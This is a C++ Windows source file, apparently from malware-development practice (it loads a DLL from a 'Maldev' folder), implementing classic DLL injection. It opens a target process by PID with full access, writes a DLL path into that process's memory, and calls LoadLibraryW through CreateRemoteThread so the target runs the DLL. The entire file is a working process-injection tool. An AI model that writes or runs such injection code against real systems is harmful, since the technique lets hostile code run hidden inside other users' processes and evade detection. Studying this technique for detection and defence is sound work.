#include "pch.h"
#include <windows.h>
#include <cstdlib>
#include <stdio.h>




const char* k = "[+]";
const char* e = "[-]";
const char* i = "[*]";

DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HMODULE hkernal32 = NULL;
HANDLE hprocess, hThread = NULL;

wchar_t dllpath[MAX_PATH] = L"D:\\Maldev\\DLL.dll";
size_t dllpathSize = sizeof(dllpath);
size_t dllsize = sizeof(dllpath); // Assuming dllsize should be the size of the DLL path

#define EXIT_FAILURE 1
#define EXIT_SUCCESS 0

int main(int argc, char* args[]) {
    if (argc < 2) {
        printf("%s usage: %s", e, args[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(args[1]);

    printf("%s Trying to Get a handle to the process (%ld)\n", i, PID); //Write the process ID of the process you want to inject your dll)

    hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    if (hprocess == NULL) {
        printf("%s failed to get a handle to the process, error: %ld", e, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s Got handle to a process (%ld)\n\\---0x%p\n", k, PID, hprocess);

    rBuffer = VirtualAllocEx(hprocess, NULL, dllsize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    printf("%s Allocated buffer to process memory w/PAGE_READWRITE permission\n", k);

    if (rBuffer == NULL) {
        printf("%s Couldn't create rBuffer, error: %ld", e, GetLastError());
        return EXIT_FAILURE;
    }

    WriteProcessMemory(hprocess, rBuffer, dllpath, dllpathSize, NULL);
    printf("%s wrote[%S] to process memory\n", k, dllpath);

    hkernal32 = GetModuleHandleW(L"kernel32");

    if (hkernal32 == NULL) {
        printf("%s Failed to get a handle to the kernel32.dll, error:%ld", e, GetLastError());
        CloseHandle(hprocess);
        return EXIT_FAILURE;
    }

    printf("%s got a handle to kernel32.dll\n\\-- - 0x%p\n", k, hkernal32);

    LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hkernal32, "LoadLibraryW");
    printf("%s got the address of the LoadLibraryW()\n\\-- - 0x%p\n", k, startThis);

    hThread = CreateRemoteThread(hprocess, NULL, 0, startThis, rBuffer, 0, &TID);

    if (hThread == NULL) {
        printf("%s Failed to get a handle to the Thread, error:%ld", e, GetLastError());
        CloseHandle(hprocess);
        return EXIT_FAILURE;
    }

    printf("%s Got a handle to the newly created thread (%ld)\n\\-- - 0x%p\n", k, TID, hThread);
    printf("%s waiting for the thread to finish execution\n", i);

    WaitForSingleObject(hThread, INFINITE);
    printf("%s thread  finished execution, cleaning up\n", k);

    CloseHandle(hThread);
    CloseHandle(hprocess);

    printf("%s FINISHED SEE YOU NEXT TIME > :))", k);

    return EXIT_SUCCESS;
}
